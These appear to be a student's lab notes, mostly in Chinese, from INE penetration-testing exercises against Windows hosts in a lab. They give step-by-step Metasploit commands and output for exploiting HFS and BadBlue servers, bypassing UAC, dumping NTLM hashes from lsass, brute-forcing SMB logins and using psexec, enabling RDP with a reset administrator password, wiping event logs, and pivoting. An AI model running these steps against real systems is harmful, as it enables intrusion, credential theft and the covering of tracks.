# Windows Post Exploitation
## Windows Post Exploitation Modules
	nmap -sV -p80 demo.ine.local
		80/tcp open  http    HttpFileServer httpd 2.3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > background
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	
	自動列舉目前使用者權限 : 
	use post/windows/gather/win_privs
		set SESSION 1
		run
	
	 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
	 --------  ---------  -----------------------  -----------  -------------  ---
	 True      False      True                     True         1              WIN-OMCNBKR66MN\Administrator

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉目前和先前登入的使用者的清單以及使用者帳戶各自的SID
	use post/windows/gather/enum_logged_on_users
		set SESSION 1
		run


	 SID                                            Profile Path
	 ---                                            ------------
	 S-1-5-18                                       C:\Windows\system32\config\systemprofile
	 S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
	 S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
	 S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	檢查目標系統是否為虛擬機: 
	use post/windows/gather/checkvm
		set SESSION 1
		run

	[+] This is a Xen Virtual Machine

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉目標系統上已安裝的應用程式/程式的清單。
	use post/windows/gather/enum_applications
		set SESSION 1
		run

	Installed Applications
	======================

	 Name                                Version
	 ----                                -------
	 AWS Tools for Windows               3.15.1084
	 AWS Tools for Windows               3.15.1084
	 Amazon SSM Agent                    2.3.842.0

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉連接到目標所在相同 LAN 的電腦清單
	use post/windows/gather/enum_computers
		set SESSION 1
		run
	
	[-] Post aborted due to failure: unknown: Could not retrieve domain name. Is the host part of a domain?
	此模組顯示目標系統不屬於 Windows 網域
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	列舉股票列表
	use post/windows/gather/enum_shares
		set SESSION 1
		run

		[*] The following shares were found:
		[*]     Name: print$
		[*]     Path: C:\Windows\system32\spool\drivers
		[*]     Remark: Printer Drivers
		[*]     Type: DISK
## UAC Bypass: Memory Injection(Metasploit)
	nmap -sV -p80 demo.ine.local
		80/tcp open  http    HttpFileServer httpd 2.3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/http/rejetto_hfs_exec
		set RHOSTS demo.ine.local
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getuid
		Server username: VICTIM\admin
	
	meterpreter > sysinfo
		Computer        : VICTIM
		OS              : Windows Server 2012 R2 (6.3 Build 9600).
		Architecture    : x64
		System Language : en_US
		Domain          : WORKGROUP
		Logged On Users : 2
		Meterpreter     : x86/windows

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	explorer.exe
	逃避檢測並在受感染的系統中保持持久性
	有助於避免被防毒軟體或可能監視可疑活動的其他安全措施所偵測到
	
	搜尋explorer.exe的PID
	ps -S explorer.exe
		2572  2564  explorer.exe  x64   1        VICTIM\admin  C:\Windows\explorer.exe
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	用migrate指令將目前進程遷移到explorer進程
		migrate 2572
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	shell
	檢查管理員使用者是否是管理員群組的成員: 
		net localgroup administrators
		Alias name     administrators
		Comment        Administrators have complete and unrestricted access to the computer/domain
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	繞過UAC（用戶帳戶控制）來獲得高權限
	CTRL + C
	background

	運行UAC繞過記憶體注入模組
	use exploit/windows/local/bypassuac_injection
		set session 1
		set TARGET 1
		set PAYLOAD windows/x64/meterpreter/reverse_tcp
		exploit

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > getsystem
	...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
	meterpreter > getuid
	Server username: NT AUTHORITY\SYSTEM

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	轉儲用戶哈希值
		=> lsass.exe 惡意程式碼可以利用與此進程相關的高權限和系統級存取權限
		=> 對於提取儲存在記憶體中的敏感資訊（例如憑證、令牌和其他安全性相關資料）
		ps -S lsass.exe
		 488  396   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\lsass.exe
		migrate 488
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > hashdump
		admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
		Administrator:500:aad3b435b51404eeaad3b435b51404ee:f168d9f8e6c5b893b8c4dfa202228235:::
		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
		
	管理員 NTLM 哈希： f168d9f8e6c5b893b8c4dfa202228235
## Exploiting SMB With PsEcec
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	nmap -sV -sC demo.ine.local
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use auxiliary/scanner/smb/smb_login
		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
		set RHOSTS demo.ine.local
		set VERBOSE false
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/smb/psexec
		set RHOSTS demo.ine.local
		set SMBUser Administrator
		set SMBPass qwertyuiop
		exploit
## Window: Enabling Remote Desktop
	nmap -sV -sC demo.ine.local
		80/tcp    open  http         BadBlue httpd 2.7
	RDP 預設連接埠未公開 - 3389
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit badblue 2.7 | grep Metasploit
		BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)  | windows/remote/16806.rb
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
	search badblue
	use exploit/windows/http/badblue_passthru
		set RHOSTS demo.ine.local
		exploit
	CTRL +z y
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	啟用 RDP 服務 : 
	use post/windows/manage/enable_rdp
		set SESSION 1
		exploit
	[+]     RDP Service Started
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	更改管理員密碼: 
	sessions -i 1
	shell
	net user administrator hacker_123321
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	xfreerdp /u:administrator /p:hacker_123321 /v:demo.ine.local

## Clearing Windows Event logs
	nmap -sV -sC demo.ine.local
		80/tcp    open  http               BadBlue httpd 
		3389/tcp  open  ssl/ms-wbt-server?
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		use exploit/windows/http/badblue_passthru
		set RHOSTS demo.ine.local
		exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	清除整個 Windows 事件日誌的功能: 
	meterpreter > clearev
		[*] Wiping 257 records from Application...
		[*] Wiping 510 records from System...
		[*] Wiping 15902 records from Security...

## Pivoting
	ping demo2.ine.local
	PING demo2.ine.local (10.0.31.80) 56(84) bytes of data.

	nmap -sV -sC demo1.ine.local
		80/tcp    open  http               HttpFileServer httpd 2.3
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	msfconsole -q
		search hfs
		use exploit/windows/http/rejetto_hfs_exec 
		set RHOSTS demo1.ine.local
		run
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	shell
	ping 10.0.31.80
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	meterpreter > run autoroute -s 10.0.31.80/20

	[+] Added route to 10.0.31.80/255.255.240.0 via 10.0.30.140
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	執行連接埠掃描器 (nmap)
	background
	use auxiliary/scanner/portscan/tcp
		set RHOSTS demo2.ine.local
		set PORTS 1-100
		exploit

	[+] 10.0.31.80:           - 10.0.31.80:80 - TCP OPEN
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	將遠端連接埠 80 轉送到本機連接埠 1234
		sessions -i 1
		portfwd add -l 1234 -p 80 -r demo2.ine.local
		[*] Forward TCP relay created: (local) :1234 -> (remote) demo2.ine.local:80
	
		portfwd list
		1      0.0.0.0:1234  demo2.ine.local:80  Forward
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	使用 Nmap 抓取: 
		nmap -sV -sS -p 1234 localhost
		1234/tcp open  tcpwrapped
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	searchsploit badblue 2.7
	background
		use exploit/windows/http/badblue_passthru
		set PAYLOAD windows/meterpreter/bind_tcp
		set RHOSTS demo2.ine.local
		exploit
# Metasploit GUIs
## Port Scanning and Enumeration with Armitage
	=> Armitage 是 Metasploit 的圖形化網路攻擊管理工具
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	啟動 postgresql 資料庫服務 : 
		service postgresql start
		service postgresql status
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	啟動 Armitage：
		armitage
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		Host : 127.0.0.1
		Port : 55553
		User : msf
		Pass : armitage
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	新增目標機器的IP位址/網域名稱來開始: 
		Host > Add Hosts > demo1.ine.local
	Nmap 掃描: 
		Hosts > Nmap Scan > Quick Scan (OS detect)
	右鍵單擊系統:  
		Scan
	右鍵單擊系統 : 
		Services
	=> 查看目標系統上執行的開放連接埠和服務

## Exploitation and Post Exploitation with Armitage
	將從上一個實驗中停止的地方繼續
	rejetto
	exploit > windows > http > rejetto_hfs_exec > launch
	系統窗格將更新目標系統的映像以反映成功的利用
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	右鍵單擊系統: 
		Meterpreter 1 > interact > Meterpreter Shell
	取得系統資訊 : sysinfo
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	從目標系統轉儲使用者帳戶雜湊值: 
		Meterpreter 1 > Access > Dump Hashes > lsass method

	[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
	[+] 	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

